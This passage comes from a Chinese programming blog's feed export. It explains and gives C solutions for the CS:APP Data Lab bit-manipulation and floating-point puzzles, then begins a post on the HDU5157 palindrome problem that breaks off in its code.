class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">/* </div><div class="line"> * logicalShift - shift x to the <span class="built_in">right</span> by <span class="built_in">n</span>, using a logical shift</div><div class="line"> *   Can assume that <span class="number">0</span> &lt;= <span class="built_in">n</span> &lt;= <span class="number">31</span></div><div class="line"> *   Exampl<span class="symbol">es:</span> logicalShift(<span class="number">0</span>x87654321,<span class="number">4</span>) = <span class="number">0</span>x08765432</div><div class="line"> *   Legal o<span class="symbol">ps:</span> ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</div><div class="line"> *   <span class="built_in">Max</span> o<span class="symbol">ps:</span> <span class="number">20</span></div><div class="line"> *   Rati<span class="symbol">ng:</span> <span class="number">3</span> </div><div class="line"> */</div><div class="line"><span class="built_in">int</span> logicalShift(<span class="built_in">int</span> x, <span class="built_in">int</span> <span class="built_in">n</span>) &#123;</div><div class="line">  <span class="built_in">int</span> tmp = (~<span class="number">0</span>)&lt;&lt;(<span class="number">32</span> + (~<span class="built_in">n</span>));</div><div class="line">  tmp = tmp &lt;&lt; <span class="number">1</span>;</div><div class="line">  return x&gt;&gt;<span class="built_in">n</span> &amp; (~tmp);</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="bitCount"><a href="#bitCount" class="headerlink" title="bitCount"></a>bitCount</h2><p>计算二进制中bit为1的个数，由于不能使用循环等操作，这道题难度很大。可以采用一种分治的思想解决。</p><p><img src="http://siofive.qiniudn.com/datalab-bitCount.jpg" alt=""></p><p>为了能够将对应位上的数字相加，需要产生5个mask，分别是0x55555555, 0x33333333, 0x0f0f0f0f, 0x00ff00ff, 0x0000ffff。 分别代表了[1,2,4,8,16]个0和1间隔。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment"> * bitCount - returns count of number of 1's in word</span></div><div class="line"><span class="comment"> *   Examples: bitCount(5) = 2, bitCount(7) = 3</span></div><div class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></div><div class="line"><span class="comment"> *   Max ops: 40</span></div><div class="line"><span class="comment"> *   Rating: 4</span></div><div class="line"><span class="comment"> */</span></div><div class="line">int bitCount(int x) &#123;</div><div class="line">  int _mask1 = <span class="number">0x55</span> | (<span class="number">0x55</span> &lt;&lt; <span class="number">8</span>);   <span class="comment">//  0x5555</span></div><div class="line">  int _mask2 = <span class="number">0x33</span> | (<span class="number">0x33</span> &lt;&lt; <span class="number">8</span>);   <span class="comment">//  0x3333</span></div><div class="line">  int _mask3 = <span class="number">0x0f</span> | (<span class="number">0x0f</span> &lt;&lt; <span class="number">8</span>);   <span class="comment">//  0x0f0f</span></div><div class="line"></div><div class="line">  int mask1 = _mask1 | (_mask1 &lt;&lt; <span class="number">16</span>);  <span class="comment">//  0x55555555 = [0101...0101]</span></div><div class="line">  int mask2 = _mask2 | (_mask2 &lt;&lt; <span class="number">16</span>);  <span class="comment">//  0x33333333 = [0011...0011]</span></div><div class="line">  int mask3 = _mask3 | (_mask3 &lt;&lt; <span class="number">16</span>);  <span class="comment">//  0x0f0f0f0f = [00001111...00001111]</span></div><div class="line">  int mask4 = <span class="number">0xff</span> | (<span class="number">0xff</span> &lt;&lt; <span class="number">16</span>);      <span class="comment">//  0x00ff00ff = [00000000111111110000000011111111]</span></div><div class="line">  int mask5 = <span class="number">0xff</span> | (<span class="number">0xff</span> &lt;&lt; <span class="number">8</span>);       <span class="comment">//  0x0000ffff = [00000000000000001111111111111111]</span></div><div class="line">  </div><div class="line">  x = (x &amp; mask1) + ((x &gt;&gt; <span class="number">1</span>) &amp; mask1);</div><div class="line">  x = (x &amp; mask2) + ((x &gt;&gt; <span class="number">2</span>) &amp; mask2);</div><div class="line">  x = (x &amp; mask3) + ((x &gt;&gt; <span class="number">4</span>) &amp; mask3);</div><div class="line">  x = (x &amp; mask4) + ((x &gt;&gt; <span class="number">8</span>) &amp; mask4);</div><div class="line">  x = (x &amp; mask5) + ((x &gt;&gt; <span class="number">16</span>) &amp; mask5);</div><div class="line">  return x;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="bang"><a href="#bang" class="headerlink" title="bang"></a>bang</h2><p>计算!x，但不能使用！</p><p>只用当x为0时，!x=1, 观察得到只有0和-0的最高位都不为1，其它的都至少有一个1（tmin有两个，-tmin=tmin）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* </span></div><div class="line"><span class="comment"> * bang - Compute !x without using !</span></div><div class="line"><span class="comment"> *   Examples: bang(3) = 0, bang(0) = 1</span></div><div class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></div><div class="line"><span class="comment"> *   Max ops: 12</span></div><div class="line"><span class="comment"> *   Rating: 4 </span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</div><div class="line">  <span class="keyword">return</span> ((~(x|(~x+<span class="number">1</span>)))&gt;&gt;<span class="number">31</span>) &amp; <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h2><p>计算tmin，直接1&lt;&lt;31即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* </span></div><div class="line"><span class="comment"> * tmin - return minimum two's complement integer </span></div><div class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></div><div class="line"><span class="comment"> *   Max ops: 4</span></div><div class="line"><span class="comment"> *   Rating: 1</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="fitsBits"><a href="#fitsBits" class="headerlink" title="fitsBits"></a>fitsBits</h2><p>这题关键点是理解题意。如果x能够被表示成n-bit的补码，则返回1. 其实问的是，用一个长度为n-bit的二进制表示补码，对应范围为[n-tmin, n-tmax]，问x是否在该范围内。</p><p>观察n-bit能够表示的范围，如果将这个数右移n-1位，如果x为正，此时x全为0，如果x为负，那么x全为1（为-1）。再将x+1之后再右移1位，此时x应该全为0.</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">/* </div><div class="line"> * fitsBits - return <span class="number">1</span> <span class="built_in">if</span> x can be represented as an </div><div class="line"> *  <span class="built_in">n</span>-bit, two's complement integer.</div><div class="line"> *   <span class="number">1</span> &lt;= <span class="built_in">n</span> &lt;= <span class="number">32</span></div><div class="line"> *   Exampl<span class="symbol">es:</span> fitsBits(<span class="number">5</span>,<span class="number">3</span>) = <span class="number">0</span>, fitsBits(-<span class="number">4</span>,<span class="number">3</span>) = <span class="number">1</span></div><div class="line"> *   Legal o<span class="symbol">ps:</span> ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</div><div class="line"> *   <span class="built_in">Max</span> o<span class="symbol">ps:</span> <span class="number">15</span></div><div class="line"> *   Rati<span class="symbol">ng:</span> <span class="number">2</span></div><div class="line"> */</div><div class="line"><span class="built_in">int</span> fitsBits(<span class="built_in">int</span> x, <span class="built_in">int</span> <span class="built_in">n</span>) &#123;</div><div class="line">  x = (x&gt;&gt;(<span class="built_in">n</span> + ~<span class="number">0</span>)) + <span class="number">1</span>;</div><div class="line">  return !(x&gt;&gt;<span class="number">1</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="divpwr2"><a href="#divpwr2" class="headerlink" title="divpwr2"></a>divpwr2</h2><p>计算x/(2^n), 并且向零取整</p><ul><li>当x为整数的时候，直接右移n为即可。</li><li>当x为负数的时候，由于要向上取整，所以需要加上偏移量。ans = (x+(1&lt;<k)-1)>&gt;k</k)-1)></li></ul><p>所以这道题的关键是先判断是否为负数，若是，加上对应的偏移量。</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">/* </div><div class="line"> * divpwr2 - Compute x/(<span class="number">2</span>^<span class="built_in">n</span>), for <span class="number">0</span> &lt;= <span class="built_in">n</span> &lt;= <span class="number">30</span></div><div class="line"> *  <span class="built_in">Round</span> toward zero</div><div class="line"> *   Exampl<span class="symbol">es:</span> divpwr2(<span class="number">15</span>,<span class="number">1</span>) = <span class="number">7</span>, divpwr2(-<span class="number">33</span>,<span class="number">4</span>) = -<span class="number">2</span></div><div class="line"> *   Legal o<span class="symbol">ps:</span> ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</div><div class="line"> *   <span class="built_in">Max</span> o<span class="symbol">ps:</span> <span class="number">15</span></div><div class="line"> *   Rati<span class="symbol">ng:</span> <span class="number">2</span></div><div class="line"> */</div><div class="line"><span class="built_in">int</span> divpwr2(<span class="built_in">int</span> x, <span class="built_in">int</span> <span class="built_in">n</span>) &#123;</div><div class="line">    <span class="built_in">int</span> s = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</div><div class="line">    return (x + (s&lt;&lt;<span class="built_in">n</span>) + ~s + <span class="number">1</span>) &gt;&gt; <span class="built_in">n</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h2><p>计算-x。-x=~x+1</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* </span></div><div class="line"><span class="comment"> * negate - return -x </span></div><div class="line"><span class="comment"> *   Example: negate(1) = -1.</span></div><div class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></div><div class="line"><span class="comment"> *   Max ops: 5</span></div><div class="line"><span class="comment"> *   Rating: 2</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</div><div class="line">  <span class="keyword">return</span> ~x + <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="isPositive"><a href="#isPositive" class="headerlink" title="isPositive"></a>isPositive</h2><p>如果x&gt;0, 返回1。否则返回0</p><p>这道题咋一看很简单，只需要判断最高位。但是0并不是一个正数，所以需要特殊处理。</p><ul><li>x为0，!x=1, ~x的最高位为1，相减得0</li><li>x为整数，!x=0, ~x的最高位为1，相减得1</li><li>x为负数，!x=0, ~x的最高位为0，相减得0</li></ul><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">/* </div><div class="line"> * isPositive - <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span> x &gt; <span class="number">0</span>, <span class="keyword">return</span> <span class="number">0</span> otherwise </div><div class="line"> *   <span class="type">Example</span>: isPositive(-<span class="number">1</span>) = <span class="number">0</span>.</div><div class="line"> *   <span class="type">Legal</span> ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</div><div class="line"> *   <span class="type">Max</span> ops: <span class="number">8</span></div><div class="line"> *   <span class="type">Rating</span>: <span class="number">3</span></div><div class="line"> */</div><div class="line"><span class="built_in">int</span> isPositive(<span class="built_in">int</span> x) &#123;</div><div class="line">  <span class="built_in">int</span> z = !x;</div><div class="line">  <span class="keyword">return</span> (((~x)&gt;&gt;<span class="number">31</span>) &amp; <span class="number">1</span>) + (~z + <span class="number">1</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h2><p>判断 x&lt;=y<br>如果直接用y-x，会溢出。所以这题需要先判断x和y的两者符号是否相同。不同的情况很好处理，如果相同，两者相减并不会发生溢出，再判断即可。</p><p>如果两者相同，x-y&lt;=0, x-y-1&lt;=-1, 即x+~y+1-1&lt;=-1。</p><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">/* </div><div class="line"> * isLessOrEqual - <span class="keyword">if</span> x &lt;= y  then <span class="keyword">return</span> <span class="number">1</span>, <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span> </div><div class="line"> *   <span class="type">Example</span>: isLessOrEqual(<span class="number">4</span>,<span class="number">5</span>) = <span class="number">1</span>.</div><div class="line"> *   <span class="type">Legal</span> ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</div><div class="line"> *   <span class="type">Max</span> ops: <span class="number">24</span></div><div class="line"> *   <span class="type">Rating</span>: <span class="number">3</span></div><div class="line"> */</div><div class="line"><span class="built_in">int</span> isLessOrEqual(<span class="built_in">int</span> x, <span class="built_in">int</span> y) &#123;</div><div class="line">  <span class="built_in">int</span> sx = (x&gt;&gt;<span class="number">31</span>) &amp; <span class="number">1</span>;</div><div class="line">  <span class="built_in">int</span> sy = (y&gt;&gt;<span class="number">31</span>) &amp; <span class="number">1</span>;</div><div class="line">  <span class="built_in">int</span> sign_diff = sx &amp; !sy;</div><div class="line">  <span class="built_in">int</span> sign_same = !(sx^sy) &amp; (((x+~y)&gt;&gt;<span class="number">31</span>) &amp; <span class="number">1</span>);</div><div class="line">  <span class="keyword">return</span> sign_diff | sign_same;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="ilog2"><a href="#ilog2" class="headerlink" title="ilog2"></a>ilog2</h2><p>ilog2(16)=4</p><p>本质上就是求x的最高位1的位置，可以使用上面bitCount中分治法的思想。ilog2(x)的最大值为31，可以表示为 ilog2(x) = 16a+8b+4c+2d+1e。其中a,b,c,d,e为0或1。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment"> * ilog2 - return floor(log base 2 of x), where x &gt; 0</span></div><div class="line"><span class="comment"> *   Example: ilog2(16) = 4</span></div><div class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></div><div class="line"><span class="comment"> *   Max ops: 90</span></div><div class="line"><span class="comment"> *   Rating: 4</span></div><div class="line"><span class="comment"> */</span></div><div class="line">int ilog2(int x) &#123;</div><div class="line">  <span class="comment">// max(x) = 31</span></div><div class="line">  <span class="comment">// x can be replace by : x = 16*a+8*b+4*c+2*d+1*e</span></div><div class="line">  int ans = <span class="number">0</span>;</div><div class="line">  ans += (!!(x&gt;&gt;<span class="number">16</span>)) &lt;&lt; <span class="number">4</span>;</div><div class="line">  ans += (!!(x&gt;&gt;(<span class="number">8</span>+ans))) &lt;&lt; <span class="number">3</span>;</div><div class="line">  ans += (!!(x&gt;&gt;(<span class="number">4</span>+ans))) &lt;&lt; <span class="number">2</span>;</div><div class="line">  ans += (!!(x&gt;&gt;(<span class="number">2</span>+ans))) &lt;&lt; <span class="number">1</span>;</div><div class="line">  ans += (!!(x&gt;&gt;(<span class="number">1</span>+ans))) &lt;&lt; <span class="number">0</span>;</div><div class="line">  return ans;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="float-neg"><a href="#float-neg" class="headerlink" title="float_neg"></a>float_neg</h2><p>用unsigned x表示float，并返回-x</p><p>先判断uf是否为NaN，如果是，返回NaN，如果不是的话，返回-uf即可。当浮点数中阶数全为1，而尾数不为0时，表示该数为NaN。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">/* </div><div class="line"> * float_neg - Return bit-level equivalent <span class="keyword">of</span> expression -f <span class="keyword">for</span></div><div class="line"> *   floating point argument f.</div><div class="line"> *   Both <span class="keyword">the</span> argument <span class="keyword">and</span> <span class="literal">result</span> are passed <span class="keyword">as</span> unsigned int's, <span class="keyword">but</span></div><div class="line"> *   they are <span class="keyword">to</span> be interpreted <span class="keyword">as</span> <span class="keyword">the</span> bit-level representations <span class="keyword">of</span></div><div class="line"> *   single-precision floating point values.</div><div class="line"> *   When argument <span class="keyword">is</span> NaN, <span class="literal">return</span> argument.</div><div class="line"> *   Legal ops: Any <span class="built_in">integer</span>/unsigned operations incl. ||, &amp;&amp;. also <span class="keyword">if</span>, <span class="keyword">while</span></div><div class="line"> *   Max ops: <span class="number">10</span></div><div class="line"> *   Rating: <span class="number">2</span></div><div class="line"> */</div><div class="line">unsigned float_neg(unsigned uf) &#123;</div><div class="line">  unsigned t = uf &amp; <span class="number">0x7fffffff</span>;</div><div class="line">  <span class="keyword">if</span> (t &gt; <span class="number">0x7f800000</span>) <span class="literal">return</span> uf;</div><div class="line"><span class="built_in">  return</span> uf ^ <span class="number">0x80000000</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="float-i2f"><a href="#float-i2f" class="headerlink" title="float_i2f"></a>float_i2f</h2><p>将一个int数转化为float</p><p>x=(s&lt;&lt;31) | (exponent&lt;&lt;23) | fraction</p><p>先得到符号位，然后如果x=0，或者x=-tmin，直接返回相应的float。如果x为负数，转化为整数考虑。再分别计算该数的exponent和fraction，在计算fraction的时候需要注意向偶数进位，并且进位之后exponent是否需要改变。具体的细节见代码注释</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* </span></div><div class="line"><span class="comment"> * float_i2f - Return bit-level equivalent of expression (float) x</span></div><div class="line"><span class="comment"> *   Result is returned as unsigned int, but</span></div><div class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></div><div class="line"><span class="comment"> *   single-precision floating point values.</span></div><div class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></div><div class="line"><span class="comment"> *   Max ops: 30</span></div><div class="line"><span class="comment"> *   Rating: 4</span></div><div class="line"><span class="comment"> */</span></div><div class="line">unsigned float_i2f(int x) &#123;</div><div class="line">  <span class="comment">// return (s&lt;&lt;31)|(exponent&lt;&lt;23)|fraction</span></div><div class="line">  int s = (x&gt;&gt;<span class="number">31</span>) &amp; <span class="number">1</span>;  <span class="comment">//sign</span></div><div class="line">  int exponent;</div><div class="line">  int fraction = <span class="number">0</span>;</div><div class="line">  int fraction_mask;</div><div class="line">  int delta;</div><div class="line">  int i = <span class="number">30</span>;</div><div class="line">  if (x == <span class="number">0</span>) return x;   <span class="comment">//x=0</span></div><div class="line">  else if (x == <span class="number">0x80000000</span>) &#123; <span class="comment">//x=-tmin, exponent = 31 + 127</span></div><div class="line">    exponent = <span class="number">158</span>;</div><div class="line">  &#125; else &#123;</div><div class="line">    if (s) x = -x;  <span class="comment">//if x is negative, change to positive</span></div><div class="line">    while(!(x&gt;&gt;i)) i--; <span class="comment">//right shift until x=0</span></div><div class="line">    exponent = i + <span class="number">127</span>;</div><div class="line">    x = x &lt;&lt; (<span class="number">31</span> - i);  <span class="comment">//clean zeros in higher bits</span></div><div class="line">    fraction_mask = <span class="number">0x7fffff</span>;</div><div class="line">    fraction = fraction_mask &amp; (x &gt;&gt; <span class="number">8</span>); <span class="comment">//get fraction</span></div><div class="line">    x = x &amp; <span class="number">0xff</span>; <span class="comment">//the lower 8 bits will be truncated</span></div><div class="line">    delta = (x &gt; <span class="number">128</span>) || ((x == <span class="number">128</span>) &amp;&amp; (fraction &amp; <span class="number">1</span>)); <span class="comment">//if x&gt;=odd.5, delta = 1</span></div><div class="line">    fraction += delta;</div><div class="line">    if (fraction &gt;&gt; <span class="number">23</span>) &#123; <span class="comment">//if fraction is larger than 23 bits</span></div><div class="line">      exponent += <span class="number">1</span>;</div><div class="line">      fraction &amp;= fraction_mask;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  return (s&lt;&lt;<span class="number">31</span>) | (exponent&lt;&lt;<span class="number">23</span>) | fraction;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="float-twice"><a href="#float-twice" class="headerlink" title="float_twice"></a>float_twice</h2><p>将给定的unsigned uf表示的float * 2</p><p>如果uf是denormalized，uf的二进制左移1就是该数乘2。如果uf <em> 2还是denormalized，好理解。如果uf </em> 2变成了normalized，阶码变为1，尾数变为0.也成立。</p><p>如果uf是normalized，直接将uf的阶码+1，但如果uf的阶码+1之后全为1，就变成了inf，需要将尾数全部置为0.</p><p>如果uf是NaN或者inf，直接返回uf。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* </span></div><div class="line"><span class="comment"> * float_twice - Return bit-level equivalent of expression 2*f for</span></div><div class="line"><span class="comment"> *   floating point argument f.</span></div><div class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int's, but</span></div><div class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></div><div class="line"><span class="comment"> *   single-precision floating point values.</span></div><div class="line"><span class="comment"> *   When argument is NaN, return argument</span></div><div class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></div><div class="line"><span class="comment"> *   Max ops: 30</span></div><div class="line"><span class="comment"> *   Rating: 4</span></div><div class="line"><span class="comment"> */</span></div><div class="line">unsigned float_twice(unsigned uf) &#123;</div><div class="line">  <span class="keyword">if</span> ((uf &amp; <span class="number">0x7f</span>800000) == <span class="number">0</span>) &#123; <span class="comment">//denormalized</span></div><div class="line">    <span class="keyword">return</span> (uf &amp; <span class="number">0x80000000</span>) | (uf &lt;&lt; <span class="number">1</span>);</div><div class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((uf &amp; <span class="number">0x7f</span>800000) != <span class="number">0x7f</span>800000) &#123;  <span class="comment">//normalized</span></div><div class="line">    uf += (<span class="number">1</span> &lt;&lt; <span class="number">23</span>);</div><div class="line">    <span class="keyword">if</span> ((uf &amp; <span class="number">0x7f</span>800000) == <span class="number">0x7f</span>800000) uf = uf &gt;&gt; <span class="number">23</span> &lt;&lt; <span class="number">23</span>;</div><div class="line">    <span class="keyword">return</span> uf;</div><div class="line">  &#125; <span class="keyword">else</span> <span class="keyword">return</span> uf;   <span class="comment">// NaN or inf </span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>整个实验内容让我更深入的理解计算机如何用二进制表示整数和浮点数，收获很大。可以配套CMU的网上课程学习该书，效果会更好。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;实验内容&quot;&gt;&lt;a href=&quot;#实验内容&quot; class=&quot;headerlink&quot; title=&quot;实验内容&quot;&gt;&lt;/a&gt;实验内容&lt;/h1&gt;&lt;p&gt;《深入理解计算机系统》的第一个实验，内容包括位操作，用二进制表示整数，浮点数，以及相应的操作。实验限定了可选用的操作符，并且
      
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="计算机基础" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
      <category term="整数表示" scheme="http://yoursite.com/tags/%E6%95%B4%E6%95%B0%E8%A1%A8%E7%A4%BA/"/>
    
      <category term="浮点数表示" scheme="http://yoursite.com/tags/%E6%B5%AE%E7%82%B9%E6%95%B0%E8%A1%A8%E7%A4%BA/"/>
    
  </entry>
  
  <entry>
    <title>HDU5157 Harry and magic string（Manacher+差分前缀）</title>
    <link href="http://yoursite.com/2015/11/04/HDU5157/"/>
    <id>http://yoursite.com/2015/11/04/HDU5157/</id>
    <published>2015-11-04T14:00:00.000Z</published>
    <updated>2017-10-01T02:36:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>源地址：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=5157" target="_blank" rel="external">http://acm.hdu.edu.cn/showproblem.php?pid=5157</a></p><h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>有一个字符串s，问有多少对子串对(suba, subb)，使得suba和subb均为回文子串，且两个子串不能有重叠部分。</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>首先可以用Manacher算法预处理出以每个字符（包括两个字符之间的位置）为中心能有多少个回文串。然后用差分前缀处理处pre、suf、sum三个数组。<br>其中pre数组表示到以某个字符结尾的回文串个数，suf表示以某个字符为开头的回文串个数，sum表示以某个字符之后的所有字符为开头的回文串个数。</p><a id="more"></a><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span 